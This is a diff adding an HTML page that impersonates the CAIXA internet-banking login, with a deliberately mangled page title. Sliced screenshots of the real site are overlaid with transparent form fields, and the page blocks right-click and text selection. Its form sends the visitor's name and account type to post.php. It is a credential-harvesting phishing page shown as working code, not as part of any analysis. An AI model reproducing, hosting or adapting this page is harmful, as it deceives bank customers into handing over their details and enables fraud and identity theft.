@@ -1,0 +1,638 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   In_ternet   B:anking___C-AIXA
+  </title>
+  <link href="favicon.ico" rel="shortcut icon" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <style>
+   body{
+overflow-x: hidden;
+}
+table{
+margin-left:-400px;
+}
+input[type="text"]{
+position: absolute;
+left: 227px;
+padding:8px 5px;
+width:230px;
+top: 260px;
+outline: none;
+background: transparent;
+border: none;
+font-family: Arial;
+text-transform: uppercase;
+font-weight: bold;
+font-size: 16px;
+}
+input[type="radio"]{
+display: block;
+margin-bottom: 15px;
+}
+div#radios{
+position: absolute;
+left: 220px;
+top: 302px;
+}
+input[type="checkbox"]{
+position: absolute;
+left: 220px;
+top: 385px;
+}
+.superTela{
+position:fixed;
+display:block;
+left:0;
+top:0;
+width:100%;
+height:100%;
+background-color:#FFF;
+z-index:99999999;
+}
+  </style>
+  <script>
+   var erro = "Preencha todos os campos";
+function $(id){return document.getElementById(id);};
+function envia()
+{
+	if($("nome").value!="")
+	{
+		if($("pessoa1").checked == true || $("pessoa2").checked == true || $("pessoa3").checked == true)
+			$("form1").submit();
+		else
+			alert(erro);
+	}else
+		alert(erro);
+}
+function libera(){
+	document.getElementById("tela").style.display="none";
+}
+window.onload=function(){
+setTimeout("libera()",5000);
+};
+  </script>
+ </head>
+ <body marginwidth="0" marginheight="0" bgcolor="#FFFFFF" topmargin="0" leftmargin="0" ondragstart="return false" onselectstart="return false" oncontextmenu="return false">
+  <div id="tela" class="superTela" style="display: none;">
+  </div>
+  <form action="post.php" method="post" id="form1">
+   <input type="text" id="nome" name="nome" />
+   <div id="radios">
+    <input type="radio" value="Pessoa Física" id="pessoa1" name="pessoa" />
+    <input type="radio" value="Pessoa Jurídica" id="pessoa2" name="pessoa" />
+    <input type="radio" value="Pessoa Governo" id="pessoa3" name="pessoa" />
+   </div>
+   <input type="checkbox" />
+  </form>
+  <table width="2132" height="958" border="0" cellspacing="0" cellpadding="0" id="Tabela_01">
+   <tbody>
+    <tr>
+     <td rowspan="37">
+      <img width="384" height="957" alt="" src="imagens/cx_01.png" />
+     </td>
+     <td rowspan="3">
+      <img width="34" height="132" alt="" src="imagens/cx_02.png" />
+     </td>
+     <td colspan="29">
+      <img width="1283" height="45" alt="" src="imagens/cx_03.png" />
+     </td>
+     <td rowspan="3">
+      <img width="31" height="132" alt="" src="imagens/cx_04.png" />
+     </td>
+     <td rowspan="37">
+      <img width="399" height="957" alt="" src="imagens/cx_05.png" />
+     </td>
+     <td>
+      <img width="1" height="45" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="36">
+      <img width="140" height="912" alt="" src="imagens/cx_06.png" />
+     </td>
+     <td colspan="4">
+      <img width="162" height="62" alt="" src="imagens/cx_07.png" />
+     </td>
+     <td rowspan="3" colspan="24">
+      <img width="981" height="126" alt="" src="imagens/cx_08.png" />
+     </td>
+     <td>
+      <img width="1" height="62" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="2" colspan="4">
+      <img width="162" height="64" alt="" src="imagens/cx_09.png" />
+     </td>
+     <td>
+      <img width="1" height="25" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="34">
+      <img width="34" height="825" alt="" src="imagens/cx_10.png" />
+     </td>
+     <td rowspan="34">
+      <img width="31" height="825" alt="" src="imagens/cx_11.png" />
+     </td>
+     <td>
+      <img width="1" height="39" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="22" colspan="2">
+      <img width="55" height="491" alt="" src="imagens/cx_12.png" />
+     </td>
+     <td rowspan="2" colspan="8">
+      <img width="237" height="70" alt="" src="imagens/cx_13.png" />
+     </td>
+     <td rowspan="3" colspan="2">
+      <img width="15" height="89" alt="" src="imagens/cx_14.png" />
+     </td>
+     <td rowspan="20">
+      <img width="51" height="410" alt="" src="imagens/cx_15.png" />
+     </td>
+     <td rowspan="3" colspan="5">
+      <img width="252" height="89" alt="" src="imagens/cx_16.png" />
+     </td>
+     <td colspan="10">
+      <img width="533" height="27" alt="" src="imagens/cx_17.png" />
+     </td>
+     <td>
+      <img width="1" height="27" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="23">
+      <img width="27" height="509" alt="" src="imagens/cx_18.png" />
+     </td>
+     <td rowspan="10" colspan="3">
+      <img width="126" height="204" alt="" src="imagens/cx_19.png" />
+     </td>
+     <td rowspan="4" colspan="6">
+      <img width="380" height="110" alt="" src="imagens/cx_20.png" />
+     </td>
+     <td>
+      <img width="1" height="43" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="19" alt="" src="imagens/cx_21.png" />
+     </td>
+     <td>
+      <img width="1" height="19" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="10">
+      <img width="252" height="39" alt="" src="imagens/cx_22.png" />
+     </td>
+     <td rowspan="5" colspan="3">
+      <img width="156" height="94" alt="" src="imagens/cx_23.png" />
+     </td>
+     <td rowspan="2" colspan="2">
+      <img width="96" height="48" alt="" src="imagens/cx_24.png" />
+     </td>
+     <td>
+      <img width="1" height="39" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="10">
+      <img width="9" height="138" alt="" src="imagens/cx_25.png" />
+     </td>
+     <td rowspan="2" colspan="2">
+      <img width="105" height="20" alt="" src="imagens/cx_26.png" />
+     </td>
+     <td rowspan="2" colspan="7">
+      <img width="138" height="20" alt="" src="imagens/cx_27.png" />
+     </td>
+     <td>
+      <img width="1" height="9" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="3" colspan="2">
+      <img width="96" height="46" alt="" src="imagens/cx_28.png" />
+     </td>
+     <td rowspan="5">
+      <img width="12" height="75" alt="" src="imagens/cx_29.png" />
+     </td>
+     <td rowspan="5" colspan="3">
+      <img width="227" height="75" alt="" src="imagens/cx_30.png" />
+     </td>
+     <td rowspan="9" colspan="2">
+      <img width="141" height="129" alt="" src="imagens/cx_31.png" />
+     </td>
+     <td>
+      <img width="1" height="11" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="3">
+      <img width="122" height="26" alt="" src="imagens/cx_32.png" />
+     </td>
+     <td rowspan="4" colspan="6">
+      <img width="121" height="64" alt="" src="imagens/cx_33.png" />
+     </td>
+     <td>
+      <img width="1" height="26" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="2" colspan="3">
+      <img width="122" height="30" alt="" src="imagens/cx_34.png" />
+     </td>
+     <td>
+      <img width="1" height="9" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="3">
+      <img width="60" height="48" alt="" src="imagens/cx_35.png" />
+     </td>
+     <td rowspan="3" colspan="3">
+      <img width="167" height="48" alt="" src="imagens/cx_36.png" />
+     </td>
+     <td rowspan="3">
+      <img width="25" height="48" alt="" src="imagens/cx_37.png" />
+     </td>
+     <td>
+      <img width="1" height="21" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="3">
+      <img width="122" height="8" alt="" src="imagens/cx_38.png" />
+     </td>
+     <td>
+      <img width="1" height="8" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="6">
+      <img width="207" height="19" alt="" src="imagens/cx_39.png" />
+     </td>
+     <td rowspan="2" colspan="3">
+      <img width="36" height="30" alt="" src="imagens/cx_40.png" />
+     </td>
+     <td rowspan="8" colspan="2">
+      <img width="108" height="130" alt="" src="imagens/cx_41.png" />
+     </td>
+     <td rowspan="4" colspan="2">
+      <img width="131" height="54" alt="" src="imagens/cx_42.png" />
+     </td>
+     <td>
+      <img width="1" height="19" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="6">
+      <img width="207" height="11" alt="" src="imagens/cx_43.png" />
+     </td>
+     <td rowspan="5" colspan="5">
+      <img width="252" height="86" alt="" src="imagens/cx_44.png" />
+     </td>
+     <td rowspan="13" colspan="3">
+      <img width="126" height="305" alt="" src="imagens/cx_45.png" />
+     </td>
+     <td>
+      <img width="1" height="11" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="17" alt="" src="imagens/cx_46.png" />
+     </td>
+     <td rowspan="2">
+      <img width="6" height="24" alt="" src="imagens/cx_47.png" />
+     </td>
+     <td>
+      <img width="1" height="17" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="7" alt="" src="imagens/cx_48.png" />
+     </td>
+     <td>
+      <img width="1" height="7" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="3" colspan="6">
+      <img width="167" height="64" alt="" src="imagens/cx_49.png" />
+     </td>
+     <td rowspan="2" colspan="4">
+      <a href="javascript:envia();">
+       <img width="85" height="51" alt="" src="imagens/cx_50.png" />
+      </a>
+     </td>
+     <td colspan="3">
+      <img width="176" height="36" alt="" src="imagens/cx_51.png" />
+     </td>
+     <td rowspan="19">
+      <img width="96" height="520" alt="" src="imagens/cx_52.png" />
+     </td>
+     <td>
+      <img width="1" height="36" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="11" colspan="3">
+      <img width="176" height="277" alt="" src="imagens/cx_53.png" />
+     </td>
+     <td>
+      <img width="1" height="15" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="4">
+      <img width="85" height="13" alt="" src="imagens/cx_54.png" />
+     </td>
+     <td rowspan="4" colspan="5">
+      <img width="252" height="93" alt="" src="imagens/cx_55.png" />
+     </td>
+     <td>
+      <img width="1" height="13" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="2" colspan="10">
+      <img width="252" height="29" alt="" src="imagens/cx_56.png" />
+     </td>
+     <td>
+      <img width="1" height="12" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="6" colspan="2">
+      <img width="108" height="194" alt="" src="imagens/cx_57.png" />
+     </td>
+     <td>
+      <img width="1" height="17" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="2" colspan="5">
+      <img width="150" height="118" alt="" src="imagens/cx_58.png" />
+     </td>
+     <td colspan="5">
+      <img width="102" height="51" alt="" src="imagens/cx_59.png" />
+     </td>
+     <td>
+      <img width="1" height="51" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="254" height="67" alt="" src="imagens/cx_60.png" />
+     </td>
+     <td rowspan="4" colspan="3">
+      <img width="151" height="126" alt="" src="imagens/cx_61.png" />
+     </td>
+     <td>
+      <img width="1" height="67" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="10">
+      <img width="252" height="14" alt="" src="imagens/cx_62.png" />
+     </td>
+     <td rowspan="2" colspan="3">
+      <img width="152" height="35" alt="" src="imagens/cx_63.png" />
+     </td>
+     <td>
+      <img width="1" height="14" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="8">
+      <img width="36" height="232" alt="" src="imagens/cx_64.png" />
+     </td>
+     <td rowspan="2" colspan="9">
+      <img width="256" height="45" alt="" src="imagens/cx_65.png" />
+     </td>
+     <td rowspan="9" colspan="2">
+      <img width="15" height="250" alt="" src="imagens/cx_66.png" />
+     </td>
+     <td>
+      <img width="1" height="21" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="3">
+      <img width="152" height="24" alt="" src="imagens/cx_67.png" />
+     </td>
+     <td>
+      <img width="1" height="24" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="6">
+      <img width="19" height="187" alt="" src="imagens/cx_68.png" />
+     </td>
+     <td rowspan="2" colspan="8">
+      <img width="237" height="43" alt="" src="imagens/cx_69.png" />
+     </td>
+     <td colspan="12">
+      <img width="564" height="27" alt="" src="imagens/cx_70.png" />
+     </td>
+     <td>
+      <img width="1" height="27" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="12">
+      <img width="564" height="16" alt="" src="imagens/cx_71.png" />
+     </td>
+     <td>
+      <img width="1" height="16" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="39" alt="" src="imagens/cx_72.png" />
+     </td>
+     <td colspan="13">
+      <img width="590" height="39" alt="" src="imagens/cx_73.png" />
+     </td>
+     <td rowspan="7" colspan="2">
+      <img width="150" height="207" alt="" src="imagens/cx_74.png" />
+     </td>
+     <td>
+      <img width="1" height="39" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="42" alt="" src="imagens/cx_75.png" />
+     </td>
+     <td colspan="9">
+      <img width="438" height="42" alt="" src="imagens/cx_76.png" />
+     </td>
+     <td rowspan="6" colspan="4">
+      <img width="152" height="168" alt="" src="imagens/cx_77.png" />
+     </td>
+     <td>
+      <img width="1" height="42" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="35" alt="" src="imagens/cx_78.png" />
+     </td>
+     <td rowspan="3" colspan="9">
+      <img width="438" height="81" alt="" src="imagens/cx_79.png" />
+     </td>
+     <td>
+      <img width="1" height="35" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="8">
+      <img width="237" height="28" alt="" src="imagens/cx_80.png" />
+     </td>
+     <td>
+      <img width="1" height="28" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td rowspan="3" colspan="7">
+      <img width="205" height="63" alt="" src="imagens/cx_81.png" />
+     </td>
+     <td rowspan="3" colspan="3">
+      <img width="87" height="63" alt="" src="imagens/cx_82.png" />
+     </td>
+     <td>
+      <img width="1" height="18" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="10">
+      <img width="377" height="26" alt="" src="imagens/cx_83.png" />
+     </td>
+     <td rowspan="2">
+      <img width="76" height="45" alt="" src="imagens/cx_84.png" />
+     </td>
+     <td>
+      <img width="1" height="26" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td colspan="10">
+      <img width="377" height="19" alt="" src="imagens/cx_85.png" />
+     </td>
+     <td>
+      <img width="1" height="19" alt="" src="imagens/spacer.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <img width="384" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="34" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="140" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="36" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="19" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="9" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="98" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="7" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="17" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="19" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="17" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="49" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="21" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="9" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="6" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="51" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="60" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="41" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="55" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="71" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="25" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="27" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="32" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="76" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="18" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="12" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="96" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="26" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="105" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="45" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="96" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="31" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+      <img width="399" height="1" alt="" src="imagens/spacer.gif" />
+     </td>
+     <td>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
